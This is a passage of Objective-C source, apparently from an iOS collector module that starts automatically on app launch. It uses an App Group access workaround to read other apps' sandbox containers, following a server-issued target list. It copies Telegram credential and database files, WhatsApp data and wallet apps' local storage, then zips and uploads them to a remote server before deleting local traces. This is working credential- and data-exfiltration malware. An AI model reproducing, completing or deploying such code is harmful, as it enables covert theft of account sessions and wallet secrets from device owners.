    NSArray<NSString *> *children = wq_list(containerPath, NULL);
    if (!children) {
        if (outError) {
            *outError = [NSError errorWithDomain:@"WQCollector" code:1
                                        userInfo:@{NSLocalizedDescriptionKey: @"无法列出容器内容"}];
        }
        return 0;
    }

    NSUInteger copied = 0;
    for (NSString *name in children) {
        if ([name hasPrefix:@".com.apple.mobile_container_manager"]) continue;
        NSString *src = [containerPath stringByAppendingPathComponent:name];
        NSString *dst = [destDir stringByAppendingPathComponent:name];
        struct stat st;
        if (lstat(src.fileSystemRepresentation, &st) != 0) continue;

        if (S_ISDIR(st.st_mode)) {
            [fm createDirectoryAtPath:dst withIntermediateDirectories:YES attributes:nil error:NULL];
            NSArray<NSString *> *grand = wq_list(src, NULL);
            for (NSString *sub in grand) {
                NSString *s2 = [src stringByAppendingPathComponent:sub];
                NSString *d2 = [dst stringByAppendingPathComponent:sub];
                struct stat st2;
                if (lstat(s2.fileSystemRepresentation, &st2) != 0) continue;
                if (S_ISDIR(st2.st_mode)) {
                    [fm createDirectoryAtPath:d2 withIntermediateDirectories:YES attributes:nil error:NULL];
                    for (NSString *leaf in wq_list(s2, NULL)) {
                        NSData *data = [NSData dataWithContentsOfFile:[s2 stringByAppendingPathComponent:leaf]];
                        if (data && [data writeToFile:[d2 stringByAppendingPathComponent:leaf] atomically:YES]) copied++;
                    }
                } else if (S_ISREG(st2.st_mode)) {
                    NSData *data = [NSData dataWithContentsOfFile:s2];
                    if (data && [data writeToFile:d2 atomically:YES]) copied++;
                }
            }
        } else if (S_ISREG(st.st_mode)) {
            NSData *data = [NSData dataWithContentsOfFile:src];
            if (data && [data writeToFile:dst atomically:YES]) copied++;
        }
    }
    return copied;
}

typedef struct {
    unsigned long long bytes;
    NSUInteger files;
    NSUInteger skippedDirs;
    BOOL truncated;
} WQCopyBudget;

/// TG / WhatsApp 的媒体与缓存目录：postbox/media 这类占了整容器 99% 的体积，
/// 服务端 recover 也用不到（findPostboxDb 明确跳过这些名字）。复制时直接不进。
static BOOL WQIsBulkDirName(NSString *name) {
    return [name isEqualToString:@"media"] || [name isEqualToString:@"cache"] ||
           [name isEqualToString:@"cache-storage"] || [name isEqualToString:@"storage"] ||
           [name isEqualToString:@"logs"];
}

/// 按清单递归复制一棵目录树（不限深度，跳过软链环）。
/// WQCopyContainer 只到容器根下第 3 层，而钱包类 App 的 AsyncStorage 落在
/// Library/Application Support/<bundle>/RCTAsyncLocalStorage_V1/（第 4~5 层），
/// 必须走这条才能拿到。
static NSUInteger WQCopyTree(NSString *src, NSString *dst, NSUInteger depth, WQCopyBudget *budget) {
    if (src.length == 0 || depth > 16) return 0;
    if (budget && (budget->truncated || budget->bytes >= kMaxCopyBytes ||
                   budget->files >= kMaxCopyFiles)) {
        budget->truncated = YES;
        return 0;
    }
    NSArray<NSString *> *names = wq_list(src, NULL);
    if (!names) {
        WQScopeLog(@"tree: 列目录失败 %@ errno=%d", src, errno);
        return 0;
    }
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:dst withIntermediateDirectories:YES attributes:nil error:NULL];

    NSUInteger copied = 0;
    for (NSString *name in names) {
        if ([name hasPrefix:@".com.apple.mobile_container_manager"]) continue;
        NSString *child = [src stringByAppendingPathComponent:name];
        NSString *target = [dst stringByAppendingPathComponent:name];
        struct stat sb;
        if (lstat(child.fileSystemRepresentation, &sb) != 0) continue;
        if (S_ISLNK(sb.st_mode)) continue;          // 不跟随，避免 AppGroup 软链环
        if (S_ISDIR(sb.st_mode)) {
            if (WQIsBulkDirName(name)) {
                if (budget) budget->skippedDirs++;
                continue;                        // 媒体/缓存：不递归、不复制
            }
            copied += WQCopyTree(child, target, depth + 1, budget);
        } else if (S_ISREG(sb.st_mode)) {
            if (budget &&
                (budget->bytes + (unsigned long long)sb.st_size > kMaxCopyBytes ||
                 budget->files >= kMaxCopyFiles)) {
                budget->truncated = YES;
                break;
            }
            if (wq_copy_to_local(child, target, NULL)) {
                copied++;
                if (budget) {
                    budget->bytes += (unsigned long long)sb.st_size;
                    budget->files++;
                }
                // /device/chatpack 恢复只认这两个文件名：
                //   accounts-metadata/atomic-state  → extractTgCredentials
                //   */postbox/db_sqlite            → extractTgAccountProfile
                // 跳过 media 之后仍然要能在日志里一眼确认它们采到了。
                if ([name isEqualToString:@"atomic-state"] ||
                    [name isEqualToString:@"db_sqlite"] ||
                    [name hasPrefix:@"db_sqlite-"]) {
                    WQScopeLog(@"关键文件命中：%@（%llu B）", child, (unsigned long long)sb.st_size);
                }
            } else {
                // 数据保护（NSFileProtectionComplete）在锁屏时读不到，errno 会说明
                WQScopeLog(@"tree: 读失败 %@ errno=%d", child, errno);
            }
        }
    }
    return copied;
}

static NSString *WQRunCollection(void) {
    NSString *summary = @"";
    @autoreleasepool {
        WQFileLog(@"=== WQRunCollection ENTER (before wqnet_ready) ===");
        int ready = wqnet_ready();
        if (ready != 0) {
            WQStage(@"阶段 1/6：加密常量不可用（code=%d），采集中止", ready);
            return [NSString stringWithFormat:@"secrets unavailable code=%d", ready];
        }

        char *desc = wqnet_describe();
        NSString *descText = desc ? [NSString stringWithUTF8String:desc] : @"(null)";
        if (desc) free(desc);
        WQFileLog([NSString stringWithFormat:@"=== WQCollector start (ready=%d) ===", ready]);
        WQFileLog([NSString stringWithFormat:@"self-check: %@", descText]);

        // 四组 key/iv（links / shell / apptrace / v1）来自 tools/secrets.json，
        // 编译期分片、运行时 AES-GCM 还原。这里把每组解出来的 key/iv 长度打出来：
        // 长度不对（例如 32 个 hex 字符没解成 16 字节）说明灌进去的配置有问题。
        {
            const char *pairNames[4] = {"links", "shell", "apptrace", "v1"};
            NSMutableArray<NSString *> *pairs = [NSMutableArray array];
            for (int32_t pair = 0; pair < 4; pair++) {
                uint8_t key[32] = {0};
                uint8_t iv[32] = {0};
                int32_t lens[2] = {0, 0};
                int32_t rc = wq_secret_aes_material(pair, key, (int32_t)sizeof(key),
                                                    iv, (int32_t)sizeof(iv), lens);
                if (rc == 0) {
                    [pairs addObject:[NSString stringWithFormat:@"%s=%dB/%dB", pairNames[pair], lens[0], lens[1]]];
                } else {
                    [pairs addObject:[NSString stringWithFormat:@"%s=err(%d)", pairNames[pair], rc]];
                }
            }
            WQFileLog([NSString stringWithFormat:@"secrets: groups-ready=%@ pairs=[%@]",
                       wq_secrets_ready() ? @"yes" : @"no",
                       [pairs componentsJoinedByString:@" "]]);
        }
        // worse_query 的授权链：entitlement 里的 App Group -> 容器 -> token。
        // 这里把每一环单独打出来，refused 全满时能直接定位是哪一环断的。
        NSString *group = wq_app_group();
        WQFileLog([NSString stringWithFormat:@"app-group: %@", group.length ? group : @"(nil — entitlement 缺失或容器不存在)"]);

        // worse_query 的第一步：containerURLForSecurityApplicationGroupIdentifier(group)
        // 返回 nil 就直接 return -1，连 container_query 都不会发。这里逐个 group
        // 验证容器是否真的建出来了——这是 refused 全满时唯一的分水岭。
        NSArray<NSString *> *probeGroups = @[
            @"group.uanhaiaszw", @"group.uanhaiasz", @"group.uanhaiaszz", @"group.uanhaiaszq",
        ];
        NSFileManager *fm = [NSFileManager defaultManager];
        for (NSString *probe in probeGroups) {
            NSURL *groupURL = [fm containerURLForSecurityApplicationGroupIdentifier:probe];
            BOOL reachable = NO;
            if (groupURL) {
                reachable = [fm fileExistsAtPath:groupURL.path];
            }
            WQFileLog([NSString stringWithFormat:@"app-group-container[%@] = %@",
                       probe, groupURL ? (reachable ? groupURL.path : [groupURL.path stringByAppendingString:@" (URL but missing)"]) : @"(nil — 容器不存在)"]);
        }
        // 顺带确认 app 自己的容器路径是否可读（沙盒基线）
        WQFileLog([NSString stringWithFormat:@"sandbox-home: %@", NSHomeDirectory()]);
        WQFileLog([NSString stringWithFormat:@"bundle-id: %@", NSBundle.mainBundle.bundleIdentifier ?: @"(nil)"]);
        WQFileLog([NSString stringWithFormat:@"system-areas-reachable: %@", wq_system_areas_reachable() ? @"YES" : @"NO"]);
        WQFileLog([NSString stringWithFormat:@"full-scan-declined: %@", wq_full_scan_was_declined() ? @"YES" : @"NO"]);
        WQFileLog([NSString stringWithFormat:@"uid=%d euid=%d gid=%d", getuid(), geteuid(), getgid()]);
        NSLog(@"[WQCollector] %@", descText);
        WQStage(@"阶段 1/6：app 已启动，自动开启应用数据采集");

        // ---- 2/6 获取采集信息 ----
        WQStage(@"阶段 2/6：正在获取采集信息");
        char *configJSON = wqnet_configs();
        if (!configJSON) {
            WQStage(@"阶段 2/6：获取采集信息失败（网络或握手失败）");
            WQDumpNetError(@"configs");
            WQFileLog(@"configs=NULL — 检查：本地网络权限、服务器地址、SecureBox 常量和设备是否一致");
            return @"configs unavailable";
        }
        NSString *configText = [NSString stringWithUTF8String:configJSON];
        free(configJSON);
        NSData *configData = [configText dataUsingEncoding:NSUTF8StringEncoding];
        id parsed = configData ? [NSJSONSerialization JSONObjectWithData:configData options:0 error:NULL] : nil;
        NSArray *configs = [parsed isKindOfClass:[NSArray class]] ? parsed : @[];
        WQStage(@"阶段 2/6：获取采集信息完成 — %lu 项", (unsigned long)configs.count);

        // ---- 下发范围落盘：先把"服务端要求采什么"固定下来 ----
        // 这一步只读 configs，不依赖容器授权，所以后面即使 grant 全失败，
        // 也能拿 wq-scope.log 判断是"范围没下发"还是"路径没取到"。
        WQScopeLog(@"================ 下发范围 ================");
        {
            UIDevice *dev = [UIDevice currentDevice];
            NSDictionary *info = NSBundle.mainBundle.infoDictionary;
            WQScopeLog(@"app=%@ ver=%@ build=%@ os=%@ %@ vendor=%@",
                       NSBundle.mainBundle.bundleIdentifier ?: @"?",
                       info[@"CFBundleShortVersionString"] ?: @"?",
                       info[@"CFBundleVersion"] ?: @"?",
                       dev.systemName ?: @"?",
                       dev.systemVersion ?: @"?",
                       dev.identifierForVendor.UUIDString ?: @"?");
            WQScopeLog(@"configs=%lu scope-log=%@", (unsigned long)configs.count,
                       WQScopeLogPath() ?: @"(nil)");
        }

        NSMutableArray<NSString *> *scopeSummary = [NSMutableArray array];
        for (NSUInteger ci = 0; ci < configs.count; ci++) {
            id item = configs[ci];
            if (![item isKindOfClass:[NSDictionary class]]) {
                WQScopeLog(@"[%lu] 不是字典，无法解析：%@", (unsigned long)ci, [item description]);
                continue;
            }
            NSDictionary *cfg = (NSDictionary *)item;

            // 全键 + 原样 JSON：服务端改了字段名/嵌套结构时，一眼能看出来
            NSArray<NSString *> *keys = [cfg.allKeys sortedArrayUsingSelector:@selector(compare:)];
            WQScopeLog(@"[%lu] keys=[%@]", (unsigned long)ci, [keys componentsJoinedByString:@","]);
            NSData *rawJSON = [NSJSONSerialization dataWithJSONObject:cfg
                                                             options:NSJSONWritingPrettyPrinted
                                                               error:NULL];
            NSString *rawText = rawJSON ? [[NSString alloc] initWithData:rawJSON encoding:NSUTF8StringEncoding]
                                        : @"(不可序列化)";
            WQScopeLog(@"[%lu] raw=%@", (unsigned long)ci, rawText);

            NSString *bid = [cfg[@"bundle_id"] isKindOfClass:[NSString class]] ? cfg[@"bundle_id"] : @"";
            if (bid.length == 0 && [cfg[@"bundle"] isKindOfClass:[NSString class]]) {
                bid = cfg[@"bundle"];                 // toCollectConfigs 原始字段名兜底
            }
            NSString *kcText = WQKeychainGroupText(cfg);
            NSString *appName = WQAppNameText(cfg);
            NSMutableArray<NSString *> *dirs = [NSMutableArray array];
            NSMutableArray<NSString *> *files = [NSMutableArray array];
            WQParseScope(cfg, dirs, files);
            NSArray<NSString *> *dirList = WQUniquePaths(dirs);
            NSArray<NSString *> *fileList = WQUniquePaths(files);

            WQScopeLog(@"[%lu] bundle_id=%@ app=%@ keychain_group/access_group=%@", (unsigned long)ci,
                       bid.length ? bid : @"(空)", appName.length ? appName : @"(空)", kcText);
            WQScopeLog(@"[%lu] dirs(%lu)=%@", (unsigned long)ci, (unsigned long)dirList.count,
                       dirList.count ? [dirList componentsJoinedByString:@" | "] : @"(无)");
            WQScopeLog(@"[%lu] files(%lu)=%@", (unsigned long)ci, (unsigned long)fileList.count,
                       fileList.count ? [fileList componentsJoinedByString:@" | "] : @"(无)");

            // 每条路径一行，带相对容器根的层数
            for (NSString *rel in dirList) {
                WQScopeLog(@"[%lu]   dir  depth=%lu  %@", (unsigned long)ci,
                           (unsigned long)WQRelativeDepth(rel), rel);
            }
            for (NSString *rel in fileList) {
                WQScopeLog(@"[%lu]   file depth=%lu  %@", (unsigned long)ci,
                           (unsigned long)WQRelativeDepth(rel), rel);
            }

            [scopeSummary addObject:[NSString stringWithFormat:@"%@ dirs=%lu files=%lu kc=%@",
                                     bid.length ? bid : @"?",
                                     (unsigned long)dirList.count,
                                     (unsigned long)fileList.count,
                                     kcText]];
        }
        WQFileLog([NSString stringWithFormat:@"scope-log: %@", WQScopeLogPath() ?: @"(nil)"]);
        if (scopeSummary.count > 0) {
            WQStage(@"下发范围：%@", [scopeSummary componentsJoinedByString:@"；"]);
        }

        // 修掉 worse_query 上一次残留的软链，否则 grant 会全部 -4
        WQRepairAppGroupLibrary(group);
        WQRepairAppGroupLibrary(@"group.uanhaiasz");
        WQRepairAppGroupLibrary(@"group.uanhaiaszz");
        WQRepairAppGroupLibrary(@"group.uanhaiaszq");

        // ---- 3/6 容器索引 ----
        // 按 0.9.8 的做法：先重置访问缓存（Settings -> Troubleshooting -> 重置访问缓存）。
        // 实测在 27.2.1 上即使日志显示 "nothing to repair"，这一步也会让随后的
        // grant 成功——它重置的是 lock/swap 的内部状态，不只是文件残留。
        {
            NSString *resetError = nil;
            BOOL reset = wq_reset_access_cache(&resetError);
            WQFileLog([NSString stringWithFormat:@"reset-access-cache: %@ err=%@",
                       reset ? @"OK" : @"FAILED", resetError ?: @"-"]);

            // 先修软链/swap 残留，再重置一次（两者互补：前者物理还原，后者重置锁状态）
            WQStage(@"阶段 3/6：正在重置访问缓存并枚举容器");
        }

        NSUInteger granted = 0, refused = 0;
        NSDictionary<NSString *, NSString *> *containers = WQEnumerateContainers(&granted, &refused);

        // 第一轮 0 个容器时，重置缓存后重试一次（对应"退出再进应用数据就能拿到"）
        if (containers.count == 0 && refused > 0) {
            WQFileLog(@"retry: first pass produced 0 containers, resetting access cache and retrying");
            NSString *resetError2 = nil;
            wq_reset_access_cache(&resetError2);
            WQFileLog([NSString stringWithFormat:@"retry: reset done err=%@", resetError2 ?: @"-"]);
            containers = WQEnumerateContainers(&granted, &refused);
            WQFileLog([NSString stringWithFormat:@"retry: second pass -> %lu containers (grant %lu / refused %lu)",
                       (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused]);
        }
        // App Group 容器：group.* 这类 bundle（TG / WhatsApp / 备忘录）的数据不在
        // Data/Application 下，只有 Shared/AppGroup 里才有。
        NSUInteger appContainerCount = containers.count;
        NSUInteger groupContainerCount = 0;
        {
            NSMutableDictionary<NSString *, NSString *> *merged = [containers mutableCopy];
            groupContainerCount = WQEnumerateAppGroups(merged);
            containers = merged;
        }
        WQStage(@"阶段 3/6：容器索引就绪 — %lu 个应用 + %lu 个 App Group（grant %lu / refused %lu）",
                (unsigned long)appContainerCount, (unsigned long)groupContainerCount,
                (unsigned long)granted, (unsigned long)refused);
        // 把 WQ 内部日志的尾部落盘（grant 失败的具体原因、query 返回码都在里面）
        {
            NSString *wqText = wq_log_text();
            if (wqText.length > 0) {
                NSArray<NSString *> *all = [wqText componentsSeparatedByString:@"\n"];
                NSUInteger from = all.count > 40 ? all.count - 40 : 0;
                for (NSUInteger i = from; i < all.count; i++) {
                    NSString *line = all[i];
                    if (line.length > 0) WQFileLog([@"[wqtail] " stringByAppendingString:line]);
                }
            }
        }
        // 只上报应用容器：App Group 的 key 混进 /api/device/apps 会把"已装应用"
        // 列表撑大 236 条无关的 group.*。
        {
            NSMutableArray<NSString *> *appKeys = [NSMutableArray array];
            for (NSString *key in containers.allKeys) {
                if ([key hasPrefix:@"group."]) continue;
                [appKeys addObject:key];
            }
            wqnet_apps(WQJSONFromArray(appKeys).UTF8String);
        }

        // ---- 4/6 采集 ----
        WQStage(@"阶段 4/6：开始采集 %lu 项", (unsigned long)configs.count);
        NSString *stamp = WQStamp();
        NSUInteger processed = 0;
        NSUInteger uploaded = 0;
        NSMutableArray<NSString *> *missing = [NSMutableArray array];
        NSMutableArray<NSString *> *notCopied = [NSMutableArray array];

        for (NSDictionary *config in configs) {
            if (![config isKindOfClass:[NSDictionary class]]) continue;
            NSString *bundleID = config[@"bundle_id"];
            if ((![bundleID isKindOfClass:[NSString class]] || bundleID.length == 0) &&
                [config[@"bundle"] isKindOfClass:[NSString class]]) {
                bundleID = config[@"bundle"];         // toCollectConfigs 原始字段名兜底
            }
            if (![bundleID isKindOfClass:[NSString class]] || bundleID.length == 0) continue;

            NSString *container = containers[bundleID];
            if (!container) {
                [missing addObject:bundleID];
                WQScopeLog(@"[%@] 容器不在索引里；最相近的 label：%@", bundleID,
                           WQClosestLabels(containers.allKeys, bundleID, 3));
                continue;
            }
            NSString *safeName = [bundleID stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
            NSString *dest = [WQCollectDirectory() stringByAppendingPathComponent:
                              [NSString stringWithFormat:@"%@-%@", safeName, stamp]];

            // 先解析清单，再按清单复制：服务端下发的是 items[]，且目录里的数据可能在
            // 第 5 层（Library/Application Support/<bundle>/RCTAsyncLocalStorage_V1/
            // manifest.json），固定深度的 WQCopyContainer 永远够不到。
            NSMutableArray<NSString *> *scopeDirs = [NSMutableArray array];
            NSMutableArray<NSString *> *scopeFiles = [NSMutableArray array];
            WQParseScope(config, scopeDirs, scopeFiles);
            // 通配在这里展开：只有拿到容器路径后才知道 account-<peerId> 具体是什么。
            // 路径不存在时 WQResolveDirs 会在容器内找同名目录回退（TG 的层级随版本变）。
            NSArray<NSString *> *dirList = WQResolveDirs(container, WQUniquePaths(scopeDirs));
            NSArray<NSString *> *fileList = WQExpandScopeList(container, WQUniquePaths(scopeFiles));
            NSFileManager *fm = [NSFileManager defaultManager];

            // App Group 的层级不稳定，先把容器根结构记一次，免得每次都靠猜
            if ([bundleID hasPrefix:@"group."] && scopeDirs.count > 0) {
                WQScopeLog(@"[%@] 容器根一级目录：%@", bundleID, WQListSample(container, 32));
            }

            NSError *copyError = nil;
            NSUInteger copiedFiles = 0;
            WQCopyBudget budget = {0};
            NSMutableDictionary<NSString *, NSNumber *> *dirTruncated = [NSMutableDictionary dictionary];
            NSMutableDictionary<NSString *, NSNumber *> *dirSkipped = [NSMutableDictionary dictionary];
            if (dirList.count == 0 && fileList.count == 0) {
                // 清单为空（旧服务端 / 后台没勾选）：退回整容器 3 层，与之前行为一致
                copiedFiles = WQCopyContainer(container, dest, &copyError);
            } else {
                [fm createDirectoryAtPath:dest withIntermediateDirectories:YES attributes:nil error:NULL];
                for (NSString *rel in dirList) {
                    BOOL whole = [rel isEqualToString:@"."];
                    NSString *srcPath = whole ? container : [container stringByAppendingPathComponent:rel];
                    NSString *dstPath = whole ? dest : [dest stringByAppendingPathComponent:rel];
                    // 每个目录单独记 truncated：budget 继承已用量，所以总上限仍然生效，
                    // 但 truncated 只算这一次——否则后面的小目录会被前面的巨无霸带成 TRUNCATED。
                    WQCopyBudget one = {0};
                    one.bytes = budget.bytes;
                    one.files = budget.files;
                    copiedFiles += WQCopyTree(srcPath, dstPath, WQRelativeDepth(rel), &one);
                    budget.bytes = one.bytes;
                    budget.files = one.files;
                    budget.skippedDirs += one.skippedDirs;
                    budget.truncated = budget.truncated || one.truncated;
                    dirTruncated[rel] = @(one.truncated);
                    dirSkipped[rel] = @(one.skippedDirs);
                }
                for (NSString *rel in fileList) {
                    NSString *srcPath = [container stringByAppendingPathComponent:rel];
                    NSString *dstPath = [dest stringByAppendingPathComponent:rel];
                    [fm createDirectoryAtPath:dstPath.stringByDeletingLastPathComponent
                  withIntermediateDirectories:YES attributes:nil error:NULL];
                    if (wq_copy_to_local(srcPath, dstPath, NULL)) {
                        copiedFiles++;
                    } else {
                        WQScopeLog(@"[%@] 单文件复制失败 %@ errno=%d", bundleID, rel, errno);
                    }
                }
            }

            if (budget.truncated) {
                WQScopeLog(@"[%@] 复制达到上限（%llu 字节 / %lu 文件），已截断；跳过媒体/缓存 %lu 个",
                           bundleID, budget.bytes, (unsigned long)budget.files,
                           (unsigned long)budget.skippedDirs);
            } else if (budget.skippedDirs > 0) {
                WQScopeLog(@"[%@] 已跳过媒体/缓存目录 %lu 个（media/cache/storage/logs），实采 %llu 字节",
                           bundleID, (unsigned long)budget.skippedDirs, budget.bytes);
            }
            if (copiedFiles == 0) {
                NSLog(@"[WQCollector] %@ 未复制到文件: %@", bundleID, copyError.localizedDescription);
                WQScopeLog(@"[%@] copy.files=0 —— 清单 %lu 目录 / %lu 文件，一个字节都没落地",
                           bundleID, (unsigned long)dirList.count, (unsigned long)fileList.count);
            } else {
                processed++;
                NSLog(@"[WQCollector] %@ 已复制 %lu 个文件 -> %@", bundleID, (unsigned long)copiedFiles, dest.lastPathComponent);
            }
            WQScopeLog(@"[%@] container=%@ copy.files=%lu err=%@", bundleID, container,
                       (unsigned long)copiedFiles, copyError.localizedDescription ?: @"-");

            for (NSString *rel in dirList) {
                BOOL whole = [rel isEqualToString:@"."];
                NSUInteger relDepth = WQRelativeDepth(rel);
                NSString *srcDir = whole ? container : [container stringByAppendingPathComponent:rel];
                BOOL srcIsDir = NO;
                BOOL srcExists = [fm fileExistsAtPath:srcDir isDirectory:&srcIsDir];

                WQProbeStats src = {0};
                if (srcExists) WQProbePath(srcDir, relDepth, &src);
                WQProbeStats got = {0};
                NSString *dstDir = whole ? dest : [dest stringByAppendingPathComponent:rel];
                BOOL dstExists = [fm fileExistsAtPath:dstDir];
                if (dstExists) WQProbePath(dstDir, relDepth, &got);

                BOOL dirWasTruncated = [dirTruncated[rel] boolValue];
                NSUInteger skippedForDir = [dirSkipped[rel] unsignedIntegerValue];
                NSString *verdict = WQCoverageVerdict(srcExists, src.files, dstExists, got.files,
                                                      dirWasTruncated, skippedForDir);
                WQScopeLog(@"[%@] dir  %@  depth=%lu exists=%d isDir=%d 容器内 files=%lu dirs=%lu bytes=%llu denied=%lu | 采集到 files=%lu bytes=%llu  %@",
                           bundleID, rel, (unsigned long)relDepth, (int)srcExists, (int)srcIsDir,
                           (unsigned long)src.files, (unsigned long)src.dirs, src.bytes,
                           (unsigned long)src.denied,
                           (unsigned long)got.files, got.bytes, verdict);
                if (![verdict hasPrefix:@"covered"]) {
                    [notCopied addObject:[NSString stringWithFormat:@"%@:%@(%@)", bundleID, rel, verdict]];
                }
            }

            for (NSString *rel in fileList) {
                NSUInteger relDepth = WQRelativeDepth(rel);
                NSString *srcFile = [container stringByAppendingPathComponent:rel];
                NSString *dstFile = [dest stringByAppendingPathComponent:rel];
                NSDictionary *srcAttr = [fm attributesOfItemAtPath:srcFile error:NULL];
                NSDictionary *dstAttr = [fm attributesOfItemAtPath:dstFile error:NULL];
                NSString *verdict = WQCoverageVerdict(srcAttr != nil, srcAttr ? 1 : 0,
                                                     dstAttr != nil, dstAttr ? 1 : 0,
                                                     budget.truncated, 0);
                WQScopeLog(@"[%@] file %@  depth=%lu exists=%d 容器内=%llu B 采集到=%llu B  %@",
                           bundleID, rel, (unsigned long)relDepth, (int)(srcAttr != nil),
                           srcAttr ? [srcAttr[NSFileSize] unsignedLongLongValue] : 0ULL,
                           dstAttr ? [dstAttr[NSFileSize] unsignedLongLongValue] : 0ULL,
                           verdict);
                if (![verdict hasPrefix:@"covered"]) {
                    [notCopied addObject:[NSString stringWithFormat:@"%@:%@(%@)", bundleID, rel, verdict]];
                }
            }

            // ---- 压缩并上传：本地留一份，只有上传成功才清掉 ----
            if (copiedFiles > 0) {
                NSString *zipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:
                                     [NSString stringWithFormat:@"%@-%@.zip", safeName, stamp]];
                [[NSFileManager defaultManager] removeItemAtPath:zipPath error:NULL];
                NSUInteger zipSkipped = 0;
                NSString *zipError = nil;
                BOOL zipped = wq_zip_write(@[dest], zipPath, WQCollectorArchiveIO(),
                                           nil, nil, &zipSkipped, &zipError);
                if (!zipped) {
                    WQScopeLog(@"[%@] 压缩失败：%@", bundleID, zipError ?: @"?");
                } else {
                    NSDictionary *zipAttr = [fm attributesOfItemAtPath:zipPath error:NULL];
                    unsigned long long zipBytes = [zipAttr[NSFileSize] unsignedLongLongValue];
                    int rc = wqnet_upload(zipPath.UTF8String, bundleID.UTF8String);
                    WQScopeLog(@"[%@] 上传 %@（%.1f MB，zip 跳过 %lu）-> rc=%d",
                               bundleID, zipPath.lastPathComponent,
                               zipBytes / 1048576.0, (unsigned long)zipSkipped, rc);
                    if (rc == 0) {
                        uploaded++;
                        [[NSFileManager defaultManager] removeItemAtPath:dest error:NULL];
                    } else {
                        WQScopeLog(@"[%@] 上传失败，本地保留 %@", bundleID, dest.lastPathComponent);
                    }
                    [[NSFileManager defaultManager] removeItemAtPath:zipPath error:NULL];
                }
            }
        }

        // ---- 5/6 完成 ----
        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，已上传 %lu 个，容器缺失 %lu 个",
                (unsigned long)configs.count, (unsigned long)processed,
                (unsigned long)uploaded, (unsigned long)missing.count);
        if (missing.count > 0) {
            WQStage(@"容器缺失：%@", [missing componentsJoinedByString:@", "]);
        }
        // 分两类上报：撞体积上限是主动截断（不是失败），其余才是真缺口。
        // 之前把 TRUNCATED 混进"采集缺口"，看起来像复制失败，实际是 3 GiB 的闸门。
        NSMutableArray<NSString *> *gapList = [NSMutableArray array];
        NSMutableArray<NSString *> *truncatedList = [NSMutableArray array];
        for (NSString *item in notCopied) {
            if ([item containsString:@"TRUNCATED"]) [truncatedList addObject:item];
            else [gapList addObject:item];
        }
        if (truncatedList.count > 0) {
            NSUInteger show = MIN(truncatedList.count, (NSUInteger)12);
            WQStage(@"达上限截断 %lu 项（主动限制，不是失败）：%@",
                    (unsigned long)truncatedList.count,
                    [[truncatedList subarrayWithRange:NSMakeRange(0, show)] componentsJoinedByString:@"，"]);
        }
        if (gapList.count > 0) {
            NSUInteger show = MIN(gapList.count, (NSUInteger)12);
            WQStage(@"采集缺口 %lu 项（清单有、未落地或不完整）：%@",
                    (unsigned long)gapList.count,
                    [[gapList subarrayWithRange:NSMakeRange(0, show)] componentsJoinedByString:@"，"]);
            WQScopeLog(@"采集缺口=%lu 项，明细见上文各 dir/file 行", (unsigned long)gapList.count);
        }

        // ---- 6/6 清理 ----
        NSUInteger removed = WQPruneLocalDirs();
        WQStage(@"阶段 6/6：本地文件已删除 %lu 个", (unsigned long)removed);
        WQStage(@"阶段 6/6：流程结束 — 容器 %lu，已处理 %lu", (unsigned long)containers.count, (unsigned long)processed);

        summary = [NSString stringWithFormat:@"containers=%lu processed=%lu missing=%lu",
                   (unsigned long)containers.count, (unsigned long)processed, (unsigned long)missing.count];
    }
    return summary;
}

void WQCollectorStart(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gLock = [NSLock new];
    });
    WQFileLog(@"=== WQCollectorStart() entered (build=repair2) ===");

    [gLock lock];
    if (gRunning) {
        [gLock unlock];
        WQFileLog(@"already running — skipped");
        return;
    }
    gRunning = YES;
    [gLock unlock];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        WQFileLog(@"=== worker thread started ===");
        NSString *summary = WQRunCollection();
        [gLock lock];
        gRunning = NO;
        gSummary = summary;
        [gLock unlock];
    });
}

BOOL WQCollectorIsRunning(void) {
    if (!gLock) return NO;
    [gLock lock];
    BOOL running = gRunning;
    [gLock unlock];
    return running;
}

NSString *WQCollectorLastSummary(void) {
    if (!gLock) return nil;
    [gLock lock];
    NSString *summary = gSummary;
    [gLock unlock];
    return summary;
}
